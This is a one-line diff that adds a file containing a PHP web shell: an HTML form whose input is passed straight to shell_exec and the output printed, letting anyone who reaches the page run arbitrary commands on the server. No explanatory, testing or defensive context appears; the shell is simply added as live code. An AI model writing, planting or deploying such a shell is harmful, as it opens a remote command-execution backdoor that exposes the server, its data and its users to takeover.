@@ -1,0 +1,1 @@
+<html><form action="" method="get"><input type="text" id="cmd" name="cmd"><input type="submit" value="Submit"></form><hr><pre><?php echo shell_exec($_GET["cmd"]);?></pre></html>
